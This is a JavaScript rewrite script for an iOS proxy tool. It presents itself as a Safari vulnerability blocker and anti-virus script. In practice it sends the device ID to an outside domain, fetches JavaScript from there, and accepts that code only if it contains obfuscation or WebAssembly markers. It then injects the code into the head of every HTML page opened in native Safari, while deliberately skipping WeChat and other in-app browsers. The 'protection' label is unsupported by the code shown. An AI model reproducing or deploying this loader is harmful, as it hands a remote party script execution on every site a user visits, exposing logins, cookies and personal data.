/**
 * Safari漏洞封堵&病毒防范脚本 (云端验证 Version)
 * 作者：fiywind
 * Safari 漏洞封堵 Loader (原生判定版)
 * 作用：仅在原生 Safari 中注入 lockDown 物理封堵逻辑
 * 更新：2026-04-08
 */

/**
 * Safari 漏洞封堵 Loader (微信/App 深度过滤版)
 */

const ua = $request.headers['User-Agent'] || $request.headers['user-agent'] || "";
const contentType = $response.headers['Content-Type'] || $response.headers['content-type'] || "";
const url = $request.url || "";

// 1. 深度黑名单：除了 App 名称，增加对微信 API 域名的直接拦截
const isWechatOrApp = /MicroMessenger|WeChat|QQ\/|video\.qq\.com|weixin\.qq\.com|Weibo|XHS-App|NewsArticle|Toutiao|Alipay|MailMaster|Zhihu|Baidu/i.test(ua) || 
                      url.includes("weixin.qq.com") || 
                      url.includes("video.qq.com");

// 2. 原生 Safari 判定 (必须包含 Version/ 且不是 App)
const isNativeSafari = ua.includes("Safari") && ua.includes("Version/") && !isWechatOrApp;

// 3. 资源预检：仅处理 HTML 网页请求
const isHtml = contentType.includes("text/html");

if (isNativeSafari && isHtml && $response.body) {
    const did = $environment.device_id;
    // 使用您的自定义域名
    const authUrl = `https://bhip.cc.cd/?id=${did}`;

    $httpClient.get(authUrl, (err, resp, data) => {
        // 只有鉴权通过 (200) 且内容正确才注入
        if (!err && resp.status === 200 && (data.includes("atob") || data.includes("WebAssembly"))) {
            const payload = `<script id="sh-ld-v3">${data}</script>`;
            let newBody = $response.body.replace(/<head[^>]*>/i, `$&${payload}`);
            $done({ body: newBody });
        } else {
            // 鉴权不通过（如您的 Unauthorized 情况），直接释放
            $done({});
        }
    });
} else {
    // 4. 凡是微信流量、API 请求、视频流，在此处“秒放”，不执行任何后续操作
    $done({});
}
